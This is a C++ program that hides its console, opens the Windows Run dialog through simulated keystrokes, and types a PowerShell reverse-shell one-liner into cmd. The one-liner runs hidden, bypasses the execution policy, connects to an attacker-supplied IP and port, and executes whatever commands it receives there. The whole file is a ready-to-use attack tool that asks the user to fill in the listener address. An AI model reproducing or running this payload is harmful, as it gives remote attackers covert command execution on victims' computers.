#ifdef _WIN32                                           //If current platform is windows

//Include needed libraries and headers
#include "cruzer.h"                                     //Cruzer header
#include <string>                                       //String library
#include <vector>                                       //Vector library

//Use 'cruzer' namespace
using namespace cruzer;                                 //Cruzer namespace

//Use standard namespaces for strings and vectors
using std::string;                                      //Standard namespace for string
using std::vector;                                      //Standard namespace for vector

//main function to execute
int main() {

    //Checking if terminal must be hidden
    if(isVisible()) {                                   //If current terminal is visible
        toggleConsoleVisibility(false);                 //Then, hide terminal
    }

    //Change IP and PORT here
    std::string YOUR_IP = "write.your.ip.here";         //Write your machine's ip that your listening on    
    std::string YOUR_PORT = "write_port_number_here";   //Write the port that you're current listening on

    //Open RUN dialog (WIN + R)
    delay(500);                                         //Wait for 0.5 seconds
    vector<WORD> RUNDialogKeys;                         //Create a vector where keys are stored 
    RUNDialogKeys.push_back(VK_LWIN);                   //Append / Insert / Push Windows Key
    RUNDialogKeys.push_back('R');                       //Append / Insert / Push R Key
    multiPress(RUNDialogKeys);                          //Call multiPress function for (WIN + R)

    //Open CMD Prompt (RUN -> cmd -> ENTER)
    delay(500);                                         //Wait for 0.5 seconds
    typeKeys("cmd");                                    //Type 'cmd' On RUN dialog
    keyPress(VK_RETURN);                                //Press Enter
    delay(500);                                         //Wait for 0.5 seconds
    
    
    //Windows Powershell Command To Execute:
    typeKeys("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('" + YOUR_IP + "'," + YOUR_PORT + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
    keyPress(VK_RETURN);                                //Press Enter

    return 0;                                           //Exit With Code 0 -> SUCCESS
}


#endif                                                  //End Of "IF DEFINED" Statement